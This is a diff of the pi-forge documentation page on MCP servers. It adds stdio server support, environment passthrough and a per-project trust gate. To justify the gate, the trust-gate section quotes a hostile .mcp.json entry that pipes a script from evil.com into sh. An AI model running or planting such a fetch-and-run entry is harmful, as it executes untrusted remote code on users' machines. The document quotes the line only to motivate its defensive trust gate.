@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>MCP Servers — pi-forge</title>
-  <meta name="description" content="Connecting external Model Context Protocol servers.">
+  <meta name="description" content="Remote and stdio Model Context Protocol servers, with per-project trust.">
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect x='1' y='1' width='30' height='30' rx='7' fill='%230d0d10'/><path d='M12 13 H20 M14 13 V21 M18 13 V21' stroke='%23e6e7eb' stroke-width='1.6' stroke-linecap='round' fill='none'/></svg>">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -44,6 +44,12 @@
         <a href="mobile.html">Mobile</a>
         <a href="api.html">API Examples</a>
         <a href="mcp.html" class="active">MCP Servers</a>
+        <a href="webhooks.html">Webhooks</a>
+        <a href="orchestration.html">Session Orchestration</a>
+        <a href="processes.html">Background Processes</a>
+        <a href="todo.html">Todo Tool</a>
+        <a href="ask-user-question.html">Ask User Question</a>
+        <a href="quick-actions.html">Quick Actions</a>
         <a href="sse-events.html">SSE Events</a>
       </div>
       <div class="sidebar-section">
@@ -56,7 +62,7 @@
 
     <main class="docs-main">
       <h1>MCP Servers</h1>
-      <p class="docs-subtitle">Connecting external Model Context Protocol servers.</p>
+      <p class="docs-subtitle">Remote and stdio Model Context Protocol servers, with per-project trust.</p>
 <p>pi-forge connects to MCP servers and surfaces their tools to the
 agent. Configure from <strong>Settings → MCP</strong> or by editing config files.</p>
 <blockquote>
@@ -64,18 +70,38 @@ agent. Configure from <strong>Settings → MCP</strong> or by editing config fil
 <a href="../packages/server/src/mcp/"><code>packages/server/src/mcp/</code></a> — see
 <code>manager.ts</code> for the contract.</p>
 </blockquote>
-<h2>Scope</h2>
-<ul>
-<li><strong>Remote servers only.</strong> Transports: <code>streamable-http</code> (current MCP
-spec) and <code>sse</code> (legacy). The <code>auto</code> default tries StreamableHTTP
-first and falls back to SSE — covers
+<h2>Server kinds</h2>
+<p>Two kinds, discriminated by which fields you populate (not by an
+explicit <code>kind</code> field — this matches the Claude Desktop /
+pi-mcp-adapter convention so existing <code>.mcp.json</code> files work
+unchanged):</p>
+<table>
+<thead>
+<tr>
+<th>Kind</th>
+<th>Discriminator</th>
+<th>Transport</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Remote</strong></td>
+<td><code>url</code> is set</td>
+<td><code>streamable-http</code> / <code>sse</code> (HTTP)</td>
+</tr>
+<tr>
+<td><strong>Stdio</strong></td>
+<td><code>command</code> is set</td>
+<td>pi-forge spawns the subprocess; speaks MCP over its stdin/stdout</td>
+</tr>
+</tbody></table>
+<p>Exactly one of <code>url</code> / <code>command</code> must be set per server. The
+<code>auto</code> remote transport (default) tries StreamableHTTP first and
+falls back to SSE — covers
 <a href="https://github.com/jlowin/fastmcp" target="_blank" rel="noopener noreferrer">fastmcp</a> servers regardless of
-which transport they expose.</li>
-<li><strong>stdio is not supported.</strong> Run stdio MCP servers as a separate
-process and expose them over HTTP/SSE.</li>
-<li><strong>Static-header auth only</strong> (Bearer tokens, custom headers). OAuth
-per-server consent flows are not implemented.</li>
-</ul>
+which transport they expose.</p>
+<p>Static-header auth (Bearer tokens, custom headers) for remote
+servers; explicit env-passthrough for stdio. OAuth per-server
+consent flows are not implemented.</p>
 <h2>Where servers live</h2>
 <p>Two layers, merged at session create time:</p>
 <table>
@@ -105,12 +131,19 @@ to swap a global server for a project-specific one).</p>
 <pre><code class="language-json">{
   &quot;disabled&quot;: false,
   &quot;servers&quot;: {
-    &quot;my-server&quot;: {
+    &quot;weather&quot;: {
       &quot;url&quot;: &quot;https://mcp.example.com/sse&quot;,
       &quot;transport&quot;: &quot;auto&quot;,
       &quot;enabled&quot;: true,
       &quot;headers&quot;: {
         &quot;Authorization&quot;: &quot;Bearer sk-...&quot;
+      }
+    },
+    &quot;everything&quot;: {
+      &quot;command&quot;: &quot;npx&quot;,
+      &quot;args&quot;: [&quot;-y&quot;, &quot;@modelcontextprotocol/server-everything&quot;],
+      &quot;env&quot;: {
+        &quot;OPENAI_API_KEY&quot;: &quot;sk-...&quot;
       }
     }
   }
@@ -122,6 +155,10 @@ shape, so existing files don&#39;t need rewriting:</p>
   &quot;mcpServers&quot;: {
     &quot;chrome-devtools&quot;: {
       &quot;url&quot;: &quot;https://mcp.example.com/sse&quot;
+    },
+    &quot;github&quot;: {
+      &quot;command&quot;: &quot;docker&quot;,
+      &quot;args&quot;: [&quot;run&quot;, &quot;-i&quot;, &quot;--rm&quot;, &quot;ghcr.io/github/github-mcp-server&quot;]
     }
   }
 }
@@ -132,41 +169,117 @@ shape, so existing files don&#39;t need rewriting:</p>
 <tr>
 <th>Field</th>
 <th>Type</th>
+<th>Kind</th>
 <th>Default</th>
 <th>Notes</th>
 </tr>
 </thead>
 <tbody><tr>
-<td><code>url</code></td>
-<td>string</td>
-<td>(required)</td>
-<td>The MCP endpoint URL.</td>
-</tr>
-<tr>
-<td><code>transport</code></td>
-<td><code>&quot;auto&quot;</code> | <code>&quot;streamable-http&quot;</code> | <code>&quot;sse&quot;</code></td>
-<td><code>&quot;auto&quot;</code></td>
-<td>Connection probe order. <code>auto</code> tries StreamableHTTP first.</td>
-</tr>
-<tr>
 <td><code>enabled</code></td>
 <td>boolean</td>
+<td>both</td>
 <td><code>true</code></td>
 <td>Disabled servers don&#39;t connect or contribute tools.</td>
 </tr>
 <tr>
+<td><code>url</code></td>
+<td>string</td>
+<td>remote</td>
+<td>—</td>
+<td>The MCP endpoint URL. Required for remote servers.</td>
+</tr>
+<tr>
+<td><code>transport</code></td>
+<td><code>&quot;auto&quot;</code> | <code>&quot;streamable-http&quot;</code> | <code>&quot;sse&quot;</code></td>
+<td>remote</td>
+<td><code>&quot;auto&quot;</code></td>
+<td>Connection probe order. <code>auto</code> tries StreamableHTTP first.</td>
+</tr>
+<tr>
 <td><code>headers</code></td>
 <td><code>Record&lt;string, string&gt;</code></td>
+<td>remote</td>
 <td>(none)</td>
 <td>Forwarded on every MCP RPC. Treated as secret on read — <code>GET /mcp/servers</code> returns <code>***REDACTED***</code> for every value.</td>
 </tr>
 <tr>
+<td><code>command</code></td>
+<td>string</td>
+<td>stdio</td>
+<td>—</td>
+<td>Executable to spawn. Resolved via PATH if not absolute. Required for stdio servers.</td>
+</tr>
+<tr>
+<td><code>args</code></td>
+<td><code>string[]</code></td>
+<td>stdio</td>
+<td><code>[]</code></td>
+<td>CLI args appended to <code>command</code>.</td>
+</tr>
+<tr>
+<td><code>env</code></td>
+<td><code>Record&lt;string, string&gt;</code></td>
+<td>stdio</td>
+<td>(none)</td>
+<td>Subprocess env. Pi-forge env is <strong>not</strong> inherited by default (see &quot;Stdio env&quot; below). Treated as secret on read.</td>
+</tr>
+<tr>
+<td><code>cwd</code></td>
+<td>string</td>
+<td>stdio</td>
+<td>project path (project scope) / pi-forge cwd (global)</td>
+<td>Subprocess working directory.</td>
+</tr>
+<tr>
 <td><code>disabled</code></td>
 <td>boolean (top-level)</td>
+<td>—</td>
 <td><code>false</code></td>
-<td>Master kill-switch. When <code>true</code>, NO MCP tools reach the agent regardless of per-server <code>enabled</code>. Surfaced as the toggle at the top of Settings → MCP.</td>
+<td>Master kill-switch. When <code>true</code>, NO MCP tools reach the agent regardless of per-server <code>enabled</code>.</td>
 </tr>
 </tbody></table>
+<h2>Stdio env passthrough</h2>
+<p>The MCP SDK&#39;s <code>StdioClientTransport</code> does <strong>not</strong> inherit the
+pi-forge process env by default — it uses <code>getDefaultEnvironment()</code>,
+a small allowlist (PATH, HOME, locale vars, terminal vars). This is
+safe-by-default: an <code>OPENAI_API_KEY</code> you set in your shell for
+pi-forge itself won&#39;t silently leak to every stdio MCP subprocess.</p>
+<p>pi-forge preserves that behavior: the subprocess sees
+<code>getDefaultEnvironment() ∪ cfg.env</code> (your explicit overrides win on
+collision). Pass through any credential the MCP server needs via the
+<code>env</code> field — e.g. <code>&quot;GITHUB_TOKEN&quot;: &quot;ghp_...&quot;</code>.</p>
+<h2>Stdio trust gate (project-scope only)</h2>
+<p>Project-scoped stdio entries are <strong>gated behind an explicit per-
+project trust decision</strong>. Until the operator grants trust via the
+UI, the entry sits in <code>trust_required</code> state — pi-forge does NOT
+spawn the subprocess and no tools surface. Global stdio entries
+(written to <code>${FORGE_DATA_DIR}/mcp.json</code> by the operator
+themselves) and remote project entries are never gated.</p>
+<p><strong>Why.</strong> A hostile repo could ship <code>.mcp.json</code> with a stdio entry
+like <code>{ &quot;command&quot;: &quot;curl&quot;, &quot;args&quot;: [&quot;evil.com/x.sh&quot;, &quot;|&quot;, &quot;sh&quot;] }</code>
+and silently launch a subprocess on next session-create. Remote
+entries have a smaller blast radius (they need a network endpoint
+to do anything); stdio is local code execution with whatever env
+you pass through.</p>
+<p><strong>Grant flow.</strong> First time you open a project that contains stdio
+entries, Settings → MCP surfaces a banner:</p>
+<blockquote>
+<p>This project wants to spawn N stdio MCP servers.</p>
+</blockquote>
+<p>Click <strong>Trust this project</strong>. Trust is recorded in
+<code>${FORGE_DATA_DIR}/mcp-stdio-trust.json</code> (per project, indefinite —
+no expiry). Subsequent loads bypass the gate. Adding NEW stdio
+entries to an already-trusted project does <strong>not</strong> re-prompt — the
+trust decision is scoped to &quot;this project&#39;s <code>.mcp.json</code> is allowed
+to declare stdio servers&quot;; the file&#39;s contents are part of the
+codebase you already trust. If you want per-entry confirmation,
+revoke trust first.</p>
+<p><strong>Revoke.</strong> Settings → MCP, click <strong>Revoke</strong> on the trusted banner.
+This disconnects every project-scoped MCP server and clears the
+trust record. The next session-create will re-apply the gate to
+stdio entries.</p>
+<p><strong>Cascade.</strong> Deleting the project removes its trust entry too
+(project-manager cleanup hook).</p>
 <h2>How the agent sees the tools</h2>
 <p>Each MCP tool from a connected, enabled server becomes a pi
 <code>ToolDefinition</code> namespaced as <strong><code>&lt;server&gt;__&lt;tool&gt;</code></strong> — the prefix
@@ -190,11 +303,50 @@ first <code>createAgentSession</code> for that project, then cached. Edits
 require restart or a Probe to pick up.</li>
 <li><strong>Save.</strong> <code>PUT</code> from Settings rewrites <code>mcp.json</code> atomically
 (<code>.tmp</code> + <code>rename</code>, mode 0600), then re-syncs the connection pool
-(reconnects entries whose URL / transport / headers changed).</li>
+(reconnects entries whose connection-critical fields changed —
+URL/transport/headers for remote, command/args/env/cwd for stdio).</li>
+<li><strong>Trust grant.</strong> Spawns every gated stdio entry in the project
+immediately. Remote entries are unaffected.</li>
+<li><strong>Trust revoke.</strong> Tears down the entire project pool (including
+remote entries — the next <code>ensureProjectLoaded</code> re-applies the
+gate on stdio entries).</li>
 <li><strong>Master toggle.</strong> Flipping it off doesn&#39;t disconnect anything —
 future <code>createAgentSession</code> calls skip the <code>customTools</code> injection.
 Live sessions keep the tools they booted with.</li>
 </ul>
+<h2>Connection states</h2>
+<table>
+<thead>
+<tr>
+<th>State</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>idle</code></td>
+<td>Configured but not yet connected (transient — connect attempt is in flight).</td>
+</tr>
+<tr>
+<td><code>connecting</code></td>
+<td>Handshake in progress.</td>
+</tr>
+<tr>
+<td><code>connected</code></td>
+<td>Tools listed and available to sessions.</td>
+</tr>
+<tr>
+<td><code>error</code></td>
+<td>Connect failed (or the subprocess crashed). <code>lastError</code> carries the message.</td>
+</tr>
+<tr>
+<td><code>disabled</code></td>
+<td><code>enabled: false</code> — won&#39;t connect or contribute tools.</td>
+</tr>
+<tr>
+<td><code>trust_required</code></td>
+<td>Project-scope stdio entry waiting for the operator to grant trust.</td>
+</tr>
+</tbody></table>
 <h2>Header status badge</h2>
 <p>The badge next to <strong>Settings</strong> shows a colored dot + <code>MCP X/Y</code>:</p>
 <ul>
@@ -207,19 +359,35 @@ Settings → MCP)</li>
 <p>Hidden when no servers are configured and in <code>MINIMAL_UI</code> mode.</p>
 <h2>Troubleshooting</h2>
 <p><strong>Status stuck in <code>error</code></strong> — Settings → MCP, expand the row, read
-<code>lastError</code>. Common causes: wrong URL, missing <code>Authorization</code>
-header, server returning 4xx on <code>tools/list</code>. <strong>Probe</strong> forces a
-reconnect + tool re-list.</p>
-<p><strong>Both transports fail</strong> — pin <code>transport</code> explicitly. The <code>auto</code>
-probe round-trip wastes ~100 ms per reconnect when only one transport
-actually works.</p>
-<p><strong>Headers show <code>***REDACTED***</code></strong> — read-path sentinel, not real
-data. The on-disk file still has the real value. On save, a sentinel
-value preserves the prior secret; a new value overwrites it (same
-pattern as <code>models.json</code>).</p>
+<code>lastError</code>. Common causes:</p>
+<ul>
+<li><strong>Remote:</strong> wrong URL, missing <code>Authorization</code> header, server
+returning 4xx on <code>tools/list</code>.</li>
+<li><strong>Stdio:</strong> command not found (resolve via absolute path or check
+PATH passthrough), missing required env var, subprocess crashed at
+startup (the child&#39;s stderr is inherited — check the pi-forge log).</li>
+</ul>
+<p><strong>Probe</strong> forces a reconnect + tool re-list.</p>
+<p><strong>Stdio entry stuck in <code>trust_required</code></strong> — that&#39;s the per-project
+trust gate. Settings → MCP, click <strong>Trust this project</strong> on the
+amber banner. See &quot;Stdio trust gate&quot; above.</p>
+<p><strong>Both remote transports fail</strong> — pin <code>transport</code> explicitly. The
+<code>auto</code> probe round-trip wastes ~100 ms per reconnect when only one
+transport actually works.</p>
+<p><strong>Headers / env show <code>***REDACTED***</code></strong> — read-path sentinel, not
+real data. The on-disk file still has the real value. On save, a
+sentinel value preserves the prior secret; a new value overwrites it
+(same pattern as <code>models.json</code>).</p>
 <p><strong>Tools don&#39;t appear after editing project <code>.mcp.json</code></strong> — the file
 is read once per project per server lifetime. Probe the row or
 restart pi-forge.</p>
+<p><strong>Stdio subprocess &quot;ENOENT&quot; / &quot;command not found&quot;</strong> — the SDK&#39;s
+<code>StdioClientTransport</code> resolves <code>command</code> via the subprocess&#39;s PATH.
+PATH is included in the default-allowlist passthrough, so it&#39;s
+whatever PATH pi-forge itself sees. If you&#39;re running pi-forge from
+a desktop launcher / systemd, PATH may not include <code>~/.local/bin</code>,
+<code>nvm</code>, <code>pyenv</code>, etc. — use an absolute path in <code>command</code> or extend
+PATH via the <code>env</code> field.</p>
 <h2>API surface</h2>
 <p>All routes under <code>/api/v1/mcp/</code>:</p>
 <table>
@@ -243,12 +411,12 @@ restart pi-forge.</p>
 <tr>
 <td><code>GET</code></td>
 <td><code>/mcp/servers[?projectId=…]</code></td>
-<td>Global config (redacted) + status</td>
+<td>Global config (redacted) + status; <code>?projectId</code> adds <code>stdioTrust</code></td>
 </tr>
 <tr>
 <td><code>PUT</code></td>
 <td><code>/mcp/servers/:name</code></td>
-<td>Upsert a global server</td>
+<td>Upsert a global server (remote OR stdio — pick by <code>url</code> vs <code>command</code>)</td>
 </tr>
 <tr>
 <td><code>DELETE</code></td>
@@ -265,6 +433,16 @@ restart pi-forge.</p>
 <td><code>/mcp/tools?projectId=…</code></td>
 <td>Flat tool list available to the project&#39;s sessions</td>
 </tr>
+<tr>
+<td><code>POST</code></td>
+<td><code>/mcp/trust/:projectId</code></td>
+<td>Grant project stdio trust (retries every gated entry)</td>
+</tr>
+<tr>
+<td><code>DELETE</code></td>
+<td><code>/mcp/trust/:projectId</code></td>
+<td>Revoke project stdio trust (unloads the project pool)</td>
+</tr>
 </tbody></table>
 <p>Request/response schemas in the Swagger UI at <code>/api/docs</code>.</p>
 <h2>See also</h2>
@@ -272,6 +450,7 @@ restart pi-forge.</p>
 <li><a href="./configuration.md"><code>configuration.md</code></a> — env vars + per-project overrides</li>
 <li><a href="./architecture.md"><code>architecture.md</code></a> — where the MCP manager sits</li>
 <li><a href="../packages/server/src/mcp/manager.ts"><code>packages/server/src/mcp/manager.ts</code></a> — integration contract</li>
+<li><a href="../packages/server/src/mcp/stdio-trust.ts"><code>packages/server/src/mcp/stdio-trust.ts</code></a> — trust-gate rationale</li>
 </ul>
 
     </main>
